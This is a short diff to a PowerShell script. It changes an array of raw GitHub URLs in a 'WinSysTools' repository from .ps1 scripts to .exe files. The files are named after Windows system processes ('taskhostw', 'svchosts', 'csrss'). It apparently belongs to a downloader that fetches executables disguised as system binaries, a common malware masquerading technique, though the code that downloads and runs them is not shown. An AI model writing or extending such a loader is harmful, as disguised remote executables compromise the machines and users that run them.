@@ -1,7 +1,7 @@
 $ScriptURLs = @(
-    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/taskhostw.ps1",
-    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/svchosts.ps1",
-    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/csrss.ps1",
+    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/taskhostw.exe",
+    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/svchosts.exe",
+    "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/csrss.exe",
     "https://raw.githubusercontent.com/merankhairuddin/WinSysTools/refs/heads/main/UpdateSyncTask.ps1"
 )
 
